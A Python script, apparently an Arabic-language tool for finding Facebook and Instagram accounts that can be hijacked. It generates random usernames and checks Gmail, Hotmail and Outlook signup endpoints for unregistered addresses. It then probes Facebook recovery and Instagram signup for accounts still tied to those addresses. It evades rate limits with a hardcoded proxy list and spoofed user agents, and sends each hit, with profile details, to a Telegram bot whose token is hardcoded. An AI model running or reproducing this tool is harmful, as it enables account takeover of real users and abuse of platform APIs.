try:
    import os
    from mechanize import Browser
    from requests import get as gtt
    from requests import post as po
    from faker import Faker
    import threading
    import random
    import requests
    from uuid import uuid4
    from secrets import token_hex
    from requests import post as pp
    from user_agent import generate_user_agent
    from user_agent import generate_user_agent as gg
    from random import choice as cc
    from random import randrange as rr
    import re
except ModuleNotFoundError:
    os.system("pip install mechanize")
    os.system("pip install requests")
    os.system("pip install faker")
    os.system("pip install uuid")
    os.system("pip install user_agent")
    
E = '\033[1;31m'
X = '\033[1;33m'
F = '\033[2;32m'
M = '\x1b[1;37m'
B = '\x1b[38;5;208m'
print("1 Second please")
r = requests.post('https://signup.live.com',headers={
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        })
mc = r.cookies.get_dict()['amsc']
ca = r.text.split('Canary')[4].split('","ip":"')[0].split('":"')[1].encode("ascii").decode("unicode_escape").encode("ascii").decode("unicode_escape").encode("ascii").decode("ascii")
bob = 'azertyuiopmlkjhgfdsqwxcvbn'
print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}ahmedalharrani |
|{F}[+] Tool  : {B}متاحات Facebook & Instagram |
{E}==============================''')

token = '6766017890:AAE74v_5JlgI-4SfW67UJBNURuEbIgxWhgI'
print(X + ' ═════════════════════════════════  ')
ID = 7037898496

def AvailableFP(email):
    FP = Browser()
    FP.set_handle_robots(False)
    FP.open("https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fprivacy_mutation_token%3DeyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5Mzk1MzEyLCJjYWxsc2l0ZV9pZCI6NDkyNDY4Nzk4MzkxMDk5fQ%253D%253D&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0wPtFZfYlGQb5KlRU&_rdr")
    FP._factory.is_html = True
    FP.select_form(nr=0)
    FP["email"] = email
    result = FP.submit().read()
    if "send_email" in str(result):
        tlg = f"""
HI You Have An Available FP.!!
━━━━━━━━━━━━━━━━━
- 𝐄𝐦𝐚𝐢𝐥 ⇾ {email}
━━━━━━━━━━━━━━━━━
◆ 𝐁𝐘: @maho_s9
"""
        print(F+tlg)
        po(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
    else:
        print(f'{X}Bad FaceBook .!! : [ {email} ]')
def AvailableIG(email):
    try:
        uid = uuid4().hex.upper()
        csr = token_hex(8) * 2
        miid = token_hex(13).upper()
        dtr = token_hex(13)
        proxy_list = [
    '135.181.150.104:8080',
    '135.181.45.15:8080',
    '34.151.231.232:3129',
    '128.140.7.236:8080',
    '128.140.7.236:8080',
    '34.254.90.167:9812',
    '129.154.225.163:8100',
    '80.51.221.125:8080',
    '114.129.19.139:8080',
    '34.151.231.232:3129',
    '183.221.242.107:8443',
    '135.181.45.15:8080',
    '103.84.253.10:80',
    '154.70.107.81:3128',
    '204.199.174.13:999',
    '102.165.51.172:3128',
    '103.159.96.110:8085',
    '176.95.54.202:83',
    '35.247.221.112:3129',
    '170.79.12.75:9090',
    '190.61.97.229:999',
    '103.83.179.78:2016',
    '77.89.35.50:8080',
    '35.247.221.112:3129',
    '40.76.245.70:8080',
    '64.225.8.118:9989',
    '190.19.114.104:8080',
    '149.154.157.17:5678',
    '114.4.233.34:8080',
    '186.97.102.68:999',
    '62.201.223.7:8183',
    '202.8.74.9:8080',
    '157.245.144.111:8080',
    '183.221.242.103:9443',
    '36.74.163.65:8080',
    '201.131.239.233:999',
    '218.207.72.202:3128',
    '171.6.7.198:8080',
    '79.106.170.34:8989',
    '162.212.156.172:8080',
    '179.63.149.4:999',
    '186.121.235.66:8080',
    '103.36.35.135:8080',
    '190.217.105.194:8080',
    '176.95.54.202:83',
    '182.53.85.34:8080',
    '103.69.108.78:8191',
    '36.37.146.119:32650',
    '186.150.201.38:8080',
    '35.198.9.82:3129',
    '61.139.26.94:3128',
    '103.169.19.130:8080',
    '35.198.63.193:3129',
    '34.95.187.223:3129',
    '45.174.87.18:999',
    '202.69.38.82:8080',
    '200.123.29.45:3128',
    '186.121.235.66:8080',
    '103.52.213.131:80',
    '45.61.187.67:4000',
    '45.61.187.67:4006',
    '45.61.187.67:4001',
    '45.61.187.67:4004',
    '45.61.187.67:4009',
    '34.118.86.227:8585',
    '34.125.184.194:8080',
    '34.174.159.253:8585',
    '34.172.175.72:8585',
    '34.162.190.6:8585'
]
        proxy = random.choice(proxy_list)
        cookies = {
            'csrftoken': str(csr),
            'ig_did': str(uid),
            'ig_nrcb': '1',
            'mid': str(miid),
            'datr': str(dtr),
            'ps_n': '1',
            'ps_l': '1',
            'dpr': '2.1988937854766846',
        }
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/emailsignup/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': str(generate_user_agent()),
            'x-asbd-id': '129477',
            'x-csrftoken': str(csr),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1013075128',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'enc_password': '#PWD_INSTAGRAM_BROWSER:10:1714126922:AdtQAMCnsWbipOWuXDRHogyO4JP34htWpo/FZldGPSUKbjQHHq8XtuGTOfN1lpm/WQPqq1yKuSbtODqb7inY2mufKpazjRU05K4zntNUaNuvoERjh2p8hYBT5zqz/4xvf+j2PdbN9MADlR52Jvt5vYISvw==',
            'email': str(email),
            'first_name': 'Ahmed alhrrani',
            'username': 'ahmedalhrrani',
            'client_id': str(miid),
            'seamless_login_enabled': '1',
            'opt_into_one_tap': 'false',
        }
        response = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies={'http': proxy}
        ).text

        if "email_is_taken" in response:
            print(f"{F}Available IG : [ {email} ] ")
            user = email.split('@')[0]
            try:
                headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ar,en;q=0.9',
            'cookie': f'ig_did={uid}; datr={dtr}; mid={miid}; ig_nrcb=1; csrftoken={csr}; ds_user_id=56985317140; dpr=1.25',
            'referer': f'https://www.instagram.com/{user}/?hl=ar',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.138", "Google Chrome";v="112.0.5615.138", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'viewport-width': '1051',
            'x-asbd-id': '198387',
            'x-csrftoken': str(csr),
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
        }
                rr = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={user}', headers=headers, proxies={'http': proxy})
                try:
                    Id = rr.json()['data']['user']['id']
                except:
                    Id = ""
                try:
                    name = rr.json()['data']['user']['full_name']
                except:
                    name = ""
                try:
                    bio = rr.json()['data']['user']['biography']
                except:
                    bio = ""
                try:
                    po = rr.json()['data']['user']['edge_owner_to_timeline_media']['count']
                except:
                    po = ""
                try:
                    flos = rr.json()['data']['user']['edge_followed_by']['count']
                except:
                    flos = ""
                try:
                    flog = rr.json()['data']['user']['edge_follow']['count']
                except:
                    flog = ""
                try:
                    pr = rr.json()['data']['user']['is_private']
                except:
                    pr = ""
                try:
                    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}")
                    da = re.json()['date']
                except:
                    da = 'No Date'

                tlg = f'''
HI MAHOS GIVE YOU HIT
________________________,
[√] Email ==> {email}
[√] Username ==> @{user}
[√] Name ==> {name}
[√] ID ==> {Id}
[√] Followers ==> {flos}
[√] Following ==> {flog}
[√] Bio ==> {bio}
[√] Posts ==> {po}
[√] Date ==> {da}
[√] Is Private ==> {pr}
[√] Url ==> https://www.instagram.com/{user}
_______BEST DEV_________
@maho_s9 - @maho9s
'''
                print(F+tlg)
                requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&text=" + str(tlg))
            except:
                tlg = f"""
[√] Email ==> {email}
[√] Username ==> @{user}
_______BEST DEV_________
@maho_s9 - @maho9s
"""
                requests.post(f"https://api.telegram.org/bot{token}/sendPhoto?chat_id={ID}&text=" + str(tlg))
        else:
            print(f'{X}Bad Instagram .!! : [ {email} ]')
    except:
        print("Bad Proxy")
        pass
       
def Gmail(email):
    try:
        n1 = ''.join(cc(bob) for i in range(rr(6, 9)))
        n2 = ''.join(cc(bob) for i in range(rr(3, 9)))
        host = ''.join(cc(bob) for i in range(rr(15, 30)))
        he3 = {
            "accept": "*/*",
            "accept-language": "ar-YE,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-arch": "\"\"",
            "sec-ch-ua-bitness": "\"\"",
            "sec-ch-ua-full-version": "\"116.0.5845.72\"",
            "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-model": "\"ANY-LX2\"",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua-platform-version": "\"13.0.0\"",
            "sec-ch-ua-wow64": "?0",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
            "x-client-data": "CJjbygE=",
            "x-same-domain": "1",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            'user-agent': str(gg()),
        }

        res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
        tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
            'user-agent': gg(),
        }
        data = {
            'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = pp(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        tl = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        
        cookies = {'__Host-GAPS': host}
        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
            'user-agent': gg(),
        }
        params = {'TL': tl}
        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
        response = pp(
            'https://accounts.google.com/_/signup/usernameavailability',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
        )
        if '"gf.uar",1' in response.text:
            email = email + '@gmail.com'
            print(f'{B}Good gmail .!! : [ {email} ]')
            AvailableFP(email)
            AvailableIG(email)
            
        else:
            print(f'{E}Bad Gmail .!! : [ {email}@gmail.com ]')
    except:
        print(f'{E}Bad gmail .!! : [ {email}@gmail.com ]')
        pass

def Hotmail(email):
    email = email + '@hotmail.com'
    cookies = {
            'amsc': mc,
        }
    headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': ca,
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        }

    json_data = {
            'signInName': email,
        }
    res = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
    if '"isAvailable":true' in res:
        print(f'{B}Good hotmail .!! : [ {email} ]')
        AvailableFP(email)
        AvailableIG(email)
        
    else:
        print(f'{E}Bad hotmail .!! : [ {email} ]')

def Outlook(email):
    email = email + '@outlook.com'
    cookies = {
            'amsc': mc,
        }
    headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': ca,
            'user-agent': 'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/122.0.0.0',
        }

    json_data = {
            'signInName': email,
        }
    res = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=json_data,
        ).text
    if '"isAvailable":true' in res:
        print(f'{B}Good Outlook .!! : [ {email} ]')
        AvailableFP(email)
        AvailableIG(email)
        
    else:
        print(f'{E}Bad outlook .!! : [ {email} ]')

def generate_emails():
    faker = Faker()
    faker1 = Faker('ru_RU')
    faker2 = Faker('fa')
    faker3 = Faker('en')
    faker4 = Faker('zh')
    faker5 = Faker('ar')
    faker6 = Faker('ko_KR')

    while True:
        mu = faker.user_name()
        bh = faker1.user_name()
        ch = faker2.user_name()
        dh = faker3.user_name()
        hh = faker4.user_name()
        gh = faker5.user_name()
        bu = faker6.user_name()
        user = '1234567890qwertyuiopasdfghjklzxcvbnm.'
        num = '6789'
        rng = int("".join(random.choice(num) for i in range(1)))
        name = str("".join(random.choice(user) for i in range(rng)))
        quit = [mu, bh, ch, dh, hh, gh, bu, name]
        mazen = random.choice(quit)
        email = mazen
        Gmail(email)
        Hotmail(email)
        Outlook(email)

generate_emails()
